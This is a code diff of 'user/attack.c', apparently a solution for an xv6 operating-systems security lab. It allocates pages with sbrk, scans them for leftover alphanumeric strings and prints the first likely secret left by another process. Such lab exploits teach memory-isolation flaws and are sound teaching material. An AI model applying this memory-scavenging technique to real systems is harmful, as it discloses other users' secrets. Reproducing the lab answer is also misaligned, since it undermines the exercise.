@@ -1,61 +1,63 @@
-// user/attack.c
-// sbrk-based attack for the lab: allocate new pages via sbrk and scan
-// each newly-allocated page for alphanumeric strings.
-
 #include "kernel/types.h"
+#include "kernel/fcntl.h"
 #include "user/user.h"
+#include "kernel/riscv.h"
 
-#define PGSIZE 4096
-#define MIN_SECRET_LEN 4
-#define MAX_SECRET_LEN 256
+#define PAGE 4096
+#define MAX_COPY 256   // maximum printed secret length
 
-static int isalnumc(char c) {
+static int is_alnum(char c) {
   if (c >= '0' && c <= '9') return 1;
   if (c >= 'A' && c <= 'Z') return 1;
   if (c >= 'a' && c <= 'z') return 1;
   return 0;
 }
 
-int main(int argc, char *argv[]) {
-  int tries = 2000;
+int
+main(int argc, char *argv[])
+{
+  char *p;
+  int tries = 200;        // number of pages to try
+  int i;
 
-  for (int t = 0; t < tries; t++) {
-    // allocate a page using sbrk
-    char *p = (char*)sbrk(PGSIZE);
+  // Try allocating many pages and scan each newly returned page.
+  for (i = 0; i < tries; i++) {
+    p = sbrk(PAGE);
     if (p == (char*)-1) {
-      // allocation failed; try next iteration
-      continue;
+      // no more memory
+      break;
     }
 
-    // scan the page for alphanumeric sequences
-    int i = 0;
-    int found_any = 0;
-    while (i < PGSIZE) {
-      if (!isalnumc(p[i])) { i++; continue; }
-      char buf[MAX_SECRET_LEN+1];
-      int k = 0;
-      while (i < PGSIZE && isalnumc(p[i]) && k < MAX_SECRET_LEN) {
-        buf[k++] = p[i++];
-      }
-      buf[k] = 0;
-      if (k >= MIN_SECRET_LEN) {
-        // print candidate (stdout)
-        printf("%s\n", buf);
-        // prefer short/typical secrets; accept and exit
-        if (k <= 64) {
-          exit(0);
-        }
-        found_any = 1;
+    // Scan this page for alphanumeric runs.
+    int best_len = 0;
+    int best_off = -1;
+    int off = 0;
+    while (off < PAGE) {
+      // skip non-alnum
+      while (off < PAGE && !is_alnum(p[off])) off++;
+      if (off >= PAGE) break;
+      int start = off;
+      while (off < PAGE && is_alnum(p[off])) off++;
+      int len = off - start;
+      if (len > best_len) {
+        best_len = len;
+        best_off = start;
       }
     }
 
-    if ((t % 100) == 0) {
-      // progress to stderr (so you still see it even if stdout redirected)
-      fprintf(2, "attack: tried %d pages found_any=%d\n", t, found_any);
+    if (best_len > 0) {
+      // copy and null-terminate the best candidate 
+      int copylen = best_len < (MAX_COPY - 1) ? best_len : (MAX_COPY - 1);
+      char buf[MAX_COPY];
+      int j;
+      for (j = 0; j < copylen; j++) buf[j] = p[best_off + j];
+      buf[copylen] = '\0';
+
+      // Print the candidate and exit 
+      printf("%s\n", buf);
+      exit(0);
     }
   }
 
-  fprintf(2, "attack: finished - no candidate found\n");
   exit(1);
 }
-
